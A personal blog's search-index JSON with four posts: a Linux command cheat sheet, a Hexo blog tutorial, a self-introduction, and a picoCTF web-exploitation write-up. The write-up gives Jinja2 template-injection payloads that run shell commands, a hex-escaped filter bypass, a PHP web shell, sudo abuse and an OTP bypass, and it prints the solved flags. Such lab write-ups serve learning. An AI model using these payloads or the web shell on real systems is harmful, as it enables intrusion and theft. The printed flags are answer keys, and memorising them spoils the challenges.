[{"title":"Hello World","url":"/2024/06/24/HelloWorld/","content":"OuOb"},{"title":"Linux Commands","url":"/2025/02/02/Linux%20commands/","content":"一些常用的 Linux Commands放在這裡以防我忘記\n# 顯示目前所在的目錄pwd# 顯示目前登入的使用者whoami# 列出當前目錄下的檔案和資料夾(-l:詳細信息，-a:隱藏文件)ls -la# 建立新資料夾（-p 可建立多層目錄）mkdir -p mydir/subdir# 進入資料夾cd mydir/subdir# 移動或重新命名檔案（-i：覆蓋前提示）mv -i old.txt new.txt# 複製檔案（-i：覆蓋前提示，-r：遞迴複製資料夾）cp -ir src/ backup/# 刪除檔案（-f : 強制刪除檔案，-i：刪除前提示，-r：遞迴刪除資料夾）rm -rf file.txt folder/# 移除空目錄（無法刪除非空目錄）rmdir emptydir# 更改檔案權限（r：讀取權限，w：寫入權限，x：執行權限）chmod +rwx script.sh# 尋找指定檔案（從根目錄尋找所有 .txt 檔案）find / -name &quot;.txt&quot;# 打印檔案內容（可搭配 -n 顯示行號，也可用 &gt; 合併多個文件）cat -n file1.txt file2.txt &gt; combined.txt# 使用關鍵字過濾文字內容（-i：忽略大小寫，-n：顯示行號，-r：遞歸搜索子目錄）grep -in &#x27;flag&#x27; flag.txt# 下載檔案（-O：指定輸出檔名）wget -O index.html https://example.com\nOuOb\n","tags":["Resourse"]},{"title":"picoCTF Write up (Web Exploitation)","url":"/2025/03/13/picoCTF%20Write%20up%20(Web%20Exploitation)/","content":"放一些打過的題目在這，我很菜別噴我\nEazySSTI1\nHints\nServer Side Template Injection\n\nsolve1. Initial Input Reflection\nOpen the provided URL in a browser.\nEnter any random text and click “OK”.\nThe input appears reflected in the response — indicating potential template rendering.\n\n2. Identifying Template EngineThe challenge name SSTI suggests vulnerability to Server-Side Template Injection, which occurs when user input is rendered by a template engine without proper sanitization.\nWe test with known payloads to detect the engine :\n\n\n\nEngine\nTest Payload\n\n\n\nJinja2（Flask&#x2F;Django）\n&#123;&#123; 7*7 &#125;&#125;\n\n\nFreemarker（Java）\n$&#123;7*7&#125;\n\n\nVelocity（Java）\n#set($a = 7*7)$&#123;a&#125;\n\n\nTwig（PHP）\n&#123;&#123; 7*7 &#125;&#125;\n\n\nSmarty（PHP）\n&#123;$7*7&#125;\n\n\nMako（Python）\n&lt;% print 7*7 %&gt;\n\n\nInput :\n&#123;&#123; 5*9 &#125;&#125;\nOutput: 45 → confirms Jinja2 is in use and SSTI vulnerability is present.\n3. Achieving Command ExecutionWe attempt a Command Injection payload using Jinja2 internals :Input :\n&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#x27;whoami&#x27;).read() &#125;&#125;\nSuccess → The server responds with the result of the whoami command — proving Remote Code Execution (RCE) is possible.\n4. Finding the FlagList the files :\n&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#x27;ls&#x27;).read() &#125;&#125;\nThe output includes a file named flag.\nFinal payload to read the flag :\n&#123;&#123; self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#x27;cat flag&#x27;).read() &#125;&#125;\n\n\n  flags\npicoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}\n\n\nn0s4n1ty 1\nHints\nFile upload was not sanitized\nWhenever you get a shell on a remote machine, check sudo -l\n\nsolve1. Discovering File Upload VulnerabilityUpon accessing the challenge instance, it’s clear that arbitrary files can be uploaded — indicating a file upload vulnerability. This allows for malicious script execution on the server.\n2. Uploading a PHP Web ShellCreate a simple PHP shell script :\n&lt;?phpif(isset($_GET[&#x27;cmd&#x27;]))&#123;    echo &quot;&lt;pre&gt;&quot;;    $cmd = $_GET[&#x27;cmd&#x27;];  // Get command from the query string    system($cmd);         // Execute the command and display output    echo &quot;&lt;/pre&gt;&quot;;&#125;?&gt;\nUpload this file as webshell.php via the file upload form.\n3. Triggering Remote Code Execution (RCE)Access the uploaded shell via:\nhttp://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=whoami\nResponse → Confirms RCE by displaying the current user.\n4. Checking PrivilegesExecute :\nhttp://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=sudo -l\nOutput:\nMatching Defaults entries for www-data on challenge:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser www-data may run the following commands on challenge:    (ALL) NOPASSWD: ALL\nThis reveals that the current user (www-data) can run any command as any user without a password, including root.\nNow you can execute any command as root, for example :\nhttp://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=sudo cat /root/flag.txt\n\n  flags\npicoCTF{wh47_c4n_u_d0_wPHP_4043cda3}\n\n\n\nhead-dump\nHints\nExplore backend development with us\nThe head was dumped.\n\nsolve\nExploring the Web ApplicationThe challenge begins on a blog-like website. After launching the instance, I explored the various pages and found an article titled “API Documentation”. Clicking on it redirected me to /api-docs, which opened up Swagger UI—a web interface used for exploring and testing APIs.\n\n\nKey Discovery: Swagger UI at &#x2F;api-docs\n\n\ndentifying the Critical EndpointWithin Swagger, several API endpoints were listed. One stood out:\n\n\nEndpoint: &#x2F;heapdump (found under the Diagnosing section)\n\nIts description mentioned memory analysis, which aligned with the challenge title, making it a prime target.\n\nExecuting the Endpoint\n\nUsing Swagger’s “Try it out” feature, I invoked the /heapdump endpoint. This action generated and downloaded a .heapsnapshot file — essentially a memory dump of the server.\n\nFile downloaded: heapdump-.heapsnapshot\n\n\nExtracting the Flag\n\nMemory dump files can be large and overwhelming. Rather than opening it manually, I used a simple command-line tool to scan for the flag format:\ncat heapdump-1742808189103.heapsnapshot | grep &quot;picoCTF&quot;\n\n  flags\npicoCTF{Pat!3nt_15_Th3_K3y_46022a05}\n\n\n\nCookie Monster Secret Recipe\nHints\nSometimes, the most important information is hidden in plain sight. Have you checked all parts of the webpage?\nCookies aren’t just for eating - they’re also used in web technologies!\nWeb browsers often have tools that can help you inspect various aspects of a webpage, including things you can’t see directly.\n\nslove\nAccessing the Challenge\n\nClick the link provided in the portal. You’ll be directed to a Login Page.\n\nEnter any random credentials, e.g., test:test\nClick on the Login button\n\nThis results in an Access Denied message along with a hint:\n\n💡 “Hint: Have you checked your cookies lately?”\n\n\nInvestigating Cookies\n\nFollowing the hint, open the Cookies tab in your browser’s developer tools.\n\nYou’ll notice a cookie named secret_recipe being set—even though the login failed.\n\n\nDecoding the CookieJust Copy the value of the secret_recipe cookie and decode as Base64.\n\n\n  flags\npicoCTF{c00k1e_m0nster_l0ves_c00kies_DE7A5E76}\n\n\nIntroToBurp\nHints\nTry using burpsuite to intercept request to capture the flag.\nTry mangling the request, maybe their server-side code doesn’t handle malformed requests very well.\n\nsolve\nAccessing the ChallengeClick the link provided in the portal. You’ll be directed to a registration page.\n\n\nFill in the required registration details and submit.\nThe site will redirect you to an OTP verification page.\n\n\nSubmitting a Fake OTP\n\n\nEnter any random OTP like 0000 and click Submit.\nThe response will say: Invalid OTP.\n\n\nCapturing the Request with Burp SuiteGo back to the OTP verification page and enter a new OTP again (can be anything).Intercept the request using Burp Suite and Send to Repeater.Delete the  otp=XXXX and Click Send.\n\n\n  flags\npicoCTF{ #0TP_Bypvss_SuCc3$S_c94b61ac}\n\n\n\nMediumSSTI2\nHints\nServer Side Template Injection\nWhy is blacklisting characters a bad idea to sanitize input?\n\nsolve1. Initial Payload Blocked&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat flag&#x27;).read()&#125;&#125;\nThis is too obvious → modern filters&#x2F;WAFs block dot access (.), globals, builtins, and keywords like import, os, eval.  \n2. Final Bypass Payload :&#123;&#123;request|attr(&#x27;application&#x27;)|attr(&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;)|attr(&#x27;\\x5f\\x5fgetitem\\x5f\\x5f&#x27;)(&#x27;\\x5f\\x5fbuiltins\\x5f\\x5f&#x27;)|attr(&#x27;\\x5f\\x5fgetitem\\x5f\\x5f&#x27;)(&#x27;\\x5f\\x5fimport\\x5f\\x5f&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat flag&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;\n\n\n  flags\npicoCTF{sst1_f1lt3r_byp4ss_0ef4bd3d}\n\n","tags":["WriteUp"]},{"title":"教你如何架設個人 blog","url":"/2024/11/07/%E6%9E%B6%E8%A8%AD%E5%80%8B%E4%BA%BA%20blog/","content":"如何使用 Hexo + GitHub Pages 架設個人 blog\n前言本篇主要介紹如何使用 Hexo 並搭配 GitHub Pages 來快速架設個人 blog從介紹什麼是 Hexo 框架，該如何安裝、建立環境，接著介紹一些常用指令，以及如何部署到 GitHub 上\n文章可分為下列幾個部分：\n\n什麼是 Hexo？\n前置作業\nHexo 環境建置\n開始編輯 blog\n常用指令\n把網頁部署到 Github Pages\n\n\n什麼是 Hexo？Hexo 是一個快速、簡單且高度可擴展的靜態網站生成器，主要用於 blog 和網站的創建它基於 Node.js 開發，並使用 Markdown 格式來撰寫文章，且可以通過各種插件來擴展功能，支援自定義佈局和主題\n主要特點包括：\n靜態網站生成：Hexo 將 Markdown 檔案轉換為靜態 HTML 頁面，這樣生成的網站速度較快，且容易部署在各種靜態網站托管平台上，如 GitHub Pages\n\n易於擴展：Hexo 提供了豐富的插件生態系統，可以用來增加網站功能，如 SEO 優化、社交分享、搜尋等\n\n高效的部署流程：Hexo 提供了簡單的命令行工具來生成、部署和更新網站，並且支持將網站內容快速推送到各大托管平台\n\n主題和模板：Hexo 有多樣的主題選擇，使用者可以根據自己的需求進行自定義，甚至開發自己的主題\n\n\n全都是問 ChatGPT 的不要懷疑\n\n第一步 : 前置作業在開始安裝 Hexo 之前，必須先在電腦安裝以下工具 ：\nNode.js :下載最新 LTS 版本然後 下一步*n 直到安裝成功，下載完可在 terminal 裡輸入 npm --version 或 node -v 查看版本，有顯示版本號代表成功\n# 11.5.1 或更高npm --version# v22.13.1 或更高node -v\n\n首頁看起來像這樣👇\nGit :根據作業系統下載最新版本，但注意 這次不能無腦按下一步 ，不知道怎麼下載的可以去 YT 看 印度阿三的影片，下載完可在 terminal 裡輸入 git --version 查看版本\n# 2.46.0.windows.1 或更高git --version\n首頁看起來像這樣👇\nGithub :創建一個 Repo，名稱取 &lt;your-github-username&gt;.github.io \n\n  \n    \n      範例\n\n    \n    \n      walnut8569.github.io\n\n    \n  \n\n現在前置作業已經做完了，應該不會有人看到這已經想放棄了吧，接下來要進到重頭戲了\n第二步 : Hexo 環境建置首先，先進入你打算安裝 blog 的資料夾，並打開 terminal，接著就是一連串指令\n\n  \n    \n      提示\n\n    \n    \n      #後面接的東西是註解，可以不用複製\n\n    \n  \n# 安裝 Hexo CLInpm install hexo-cli -g# 初始化 Hexohexo init# 安裝 Hexo 所需的相依套件npm install\n一切都完成後可在 terminal 裡輸入 hexo v 查看版本\n# 檢查 hexo 是否安裝成功hexo v\n\n第三步 : 開始編輯 blog首先先去 Hexo theme 找自己喜歡的主題\n找到了以後就是開始看 Hexo Docs 和 各個 theme 的 Docs 調設定，這部分不難，就是有億點耗時間這裡就用 Redefine 來做示範，絕對不是我偷懶，其中有幾個指令可以記一下 :\n# 清除快取hexo clean# 生成靜態網頁hexo g# 部署網站到雲端hexo d# 部署網站到本地hexo s\n\n\n  \n    \n      提示 1\n\n    \n    \n      不同的 theme 操作的指令會不一樣，所以請看各個 theme 的 Docs 進行操作 很重要 👉👈\n\n    \n  \n\n  \n    \n      提示 2\n\n    \n    \n      在撰寫文章或修改內容時，可以先透過 hexo s 在本地啟動伺服器 ( 預設網址為 http://localhost:4000 )且啟動伺服器時不需要額外執行 hexo g，只需按下 F5 重新整理瀏覽器就能看到當下寫完的樣子\n\n    \n  \n\n第四步 : 把網頁部署到 Github Pages首先要先到 _config.yml 裡最下方的 deploy 輸入你的 Github 帳號和 Repo\ndeploy:    type: git    repo: https://github.com/&lt;your-github-username&gt;/&lt;your-github-username&gt;.github.io  branch: main\n接著再兩串指令輕鬆上傳\n# 生成靜態網頁hexo g# 部署網站到雲端hexo d\n非常的簡單，你學會了嗎 OwOb有問題歡迎私我 IG \n","tags":["Tutorial"]},{"title":"自我介紹","url":"/2024/06/24/%E8%87%AA%E6%88%91%E4%BB%8B%E7%B4%B9/","content":"Hi 👋, I’m WalNut 不知道為何很多 blog 的自我介紹都是用這句話當開頭所以我也拿來用🤔\n以下是自介算是什麼東西都會一點點，APCS 3&#x2F;4，網頁、資安、寫遊戲也略會一些，平常沒事就是在家打遊戲、打 Code、看小說 ( 完全就是死宅 ww，然後加我 Steam 好友，我們可以一起打 Apex OwOb\n接下來就是一些資訊\nPrograming Language:\n\nC、C++、C#、Js、Python\n\n\nCTF Categories\n\nWeb、Pwn、Reverse\n\n\nOther Experience\n\n臺中市SCRATCH應用競賽國小甲組創意設計組 第二名\n臺中市中小學科學展覽會 化學科 第三名\nTCIRC 42nd 教學 &#x2F; 網管\nSCAICT 4th 會長\n2025 SCAICT 暑訓 總召 &#x2F; 助教\n\n\nSome Links\n\ngithub\nInstagram\nFacebook\nSteam\nDiscord\n\n\n\n然後就沒了其他有想到再補充 OuOb\n","tags":["Intro"]}]